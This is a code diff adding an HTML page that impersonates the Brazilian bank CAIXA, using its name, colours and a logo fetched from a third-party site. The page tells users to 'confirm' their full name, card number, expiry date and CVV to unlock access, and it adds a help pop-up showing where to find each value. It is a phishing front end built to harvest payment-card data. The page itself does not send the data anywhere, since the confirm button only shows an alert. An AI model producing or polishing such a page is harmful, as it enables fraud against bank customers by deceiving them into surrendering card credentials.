@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Confirmação - CAIXA</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { display: flex; justify-content: center; background-color: #f0f0f0; }
+        .mobile-container { width: 100%; max-width: 400px; height: 100vh; background-color: #ffffff; padding: 24px; position: relative; }
+
+        /* Cabeçalho */
+        .header { display: flex; justify-content: space-between; align-items: center; margin-top: 20px; margin-bottom: 40px; }
+        .logo img { height: 35px; }
+
+        /* Textos */
+        h1 { margin-bottom: 8px; font-size: 26px; color: #1d2124; font-weight: 800; }
+        p.subtitle { color: #5b6571; font-size: 15px; margin-bottom: 24px; line-height: 1.4; }
+
+        /* Inputs */
+        .input-group { position: relative; margin-bottom: 16px; }
+        .input-group input { width: 100%; padding: 16px; border: 1.5px solid #6b7a87; border-radius: 24px; font-size: 16px; outline: none; transition: border-color 0.2s; }
+        .input-group input:focus { border-color: #005ca9; }
+        
+        /* Layout lado a lado */
+        .row-group { display: flex; gap: 12px; }
+        .half { width: 50%; }
+
+        /* Botão Confirmar */
+        .btn-confirmar { width: 100%; padding: 16px; background-color: #F39200; color: white; border: none; border-radius: 24px; font-weight: 600; font-size: 16px; cursor: pointer; margin-top: 16px; transition: background-color 0.3s ease; }
+        .btn-confirmar:hover { background-color: #d88200; }
+
+        /* --- Estilos do Botão de Ajuda Flutuante e Modal --- */
+        
+        .btn-ajuda-flutuante {
+            position: fixed;
+            bottom: 24px;
+            right: 24px;
+            width: 50px;
+            height: 50px;
+            background-color: #005ca9; /* Azul Caixa */
+            color: #ffffff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+            z-index: 100;
+            transition: background-color 0.3s ease;
+        }
+
+        .btn-ajuda-flutuante:hover { background-color: #004a87; }
+
+        .modal-overlay {
+            display: none; /* Escondido por padrão */
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 999;
+            align-items: center;
+            justify-content: center;
+            padding: 24px;
+        }
+
+        .modal-content {
+            background-color: #ffffff;
+            border-radius: 20px;
+            padding: 24px;
+            width: 100%;
+            max-width: 350px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+        }
+
+        .modal-content h2 { margin-bottom: 16px; font-size: 20px; color: #1d2124; font-weight: 700; }
+        .modal-content ul { list-style: none; margin-bottom: 24px; }
+        .modal-content ul li { margin-bottom: 12px; font-size: 14px; color: #5b6571; line-height: 1.4; }
+        .modal-content ul li strong { color: #1d2124; }
+
+        .btn-fechar-modal {
+            width: 100%;
+            padding: 12px;
+            background-color: #ebf0f2;
+            color: #005ca9;
+            border: none;
+            border-radius: 24px;
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        
+    </style>
+</head>
+<body>
+
+    <div class="mobile-container">
+        <header class="header">
+            <div class="logo">
+                <img src="https://logo-teka.com/wp-content/uploads/2026/07/caixa-icon-logo.svg" alt="logo CAIXA">
+            </div>
+            <a href="index.html" style="color:#005ca9; text-decoration:none; font-weight: 500;">Sair</a>
+        </header>
+
+        <h1>Confirmar Dados</h1>
+        <p class="subtitle">Para sua segurança e para liberar seu acesso, confirme os dados do seu cartão titular.</p>
+
+        <div class="input-group">
+            <input type="text" placeholder="Nome Completo">
+        </div>
+        
+        <div class="input-group">
+            <input type="text" id="cartao" placeholder="Número do cartão" maxlength="19">
+        </div>
+
+        <div class="row-group">
+            <div class="input-group half">
+                <input type="text" id="data" placeholder="(MM/AA)" maxlength="5">
+            </div>
+            <div class="input-group half">
+                <input type="password" id="CVV" placeholder="CVV" maxlength="3">
+            </div>
+        </div>
+
+        <button class="btn-confirmar" onclick="alert('Dados enviados para análise com sucesso!')">Confirmar</button>
+
+        <!-- Botão Flutuante de Ajuda -->
+        <div class="btn-ajuda-flutuante" id="btnAjuda">?</div>
+    </div>
+
+    <!-- Estrutura da Modal de Ajuda -->
+    <div class="modal-overlay" id="modalAjuda">
+        <div class="modal-content">
+            <h2>Como preencher os dados?</h2>
+            <ul>
+                <li><strong>Nome Completo:</strong> Digite o nome exatamente como está impresso no seu cartão.</li>
+                <li><strong>Número do cartão:</strong> São os 16 dígitos localizados na frente ou no verso do cartão.</li>
+                <li><strong>(MM/AA):</strong> Mês e ano de vencimento do cartão.</li>
+                <li><strong>CVV:</strong> O código de segurança de 3 dígitos, geralmente localizado no verso do seu cartão.</li>
+            </ul>
+            <button class="btn-fechar-modal" id="btnFecharModal">Entendi</button>
+        </div>
+    </div>
+
+    <script>
+        // Máscara para o Número do Cartão
+        document.getElementById('cartao').addEventListener('input', function(e) {
+            let v = e.target.value.replace(/\D/g, ''); 
+            v = v.replace(/(\d{4})(?=\d)/g, '$1 '); 
+            e.target.value = v;
+        });
+
+        // Máscara para Data (MM/AA)
+        document.getElementById('data').addEventListener('input', function(e) {
+            let v = e.target.value.replace(/\D/g, '');
+            if (v.length > 2) v = v.substring(0,2) + '/' + v.substring(2,4);
+            e.target.value = v;
+        });
+
+        // Máscara para CVV
+        document.getElementById('CVV').addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '');
+            if (e.target.value.length > 3) {
+                e.target.value = e.target.value.substring(0, 3);
+            }
+        });
+
+        // --- Lógica da Modal de Ajuda ---
+        const modalAjuda = document.getElementById('modalAjuda');
+        const btnAjuda = document.getElementById('btnAjuda');
+        const btnFecharModal = document.getElementById('btnFecharModal');
+
+        // Abrir Modal
+        btnAjuda.addEventListener('click', function() {
+            modalAjuda.style.display = 'flex';
+        });
+
+        // Fechar Modal pelo botão
+        btnFecharModal.addEventListener('click', function() {
+            modalAjuda.style.display = 'none';
+        });
+
+        // Fechar Modal clicando fora do quadro branco (no fundo escuro)
+        window.addEventListener('click', function(e) {
+            if (e.target === modalAjuda) {
+                modalAjuda.style.display = 'none';
+            }
+        });
+    </script>
+</body>
+</html>
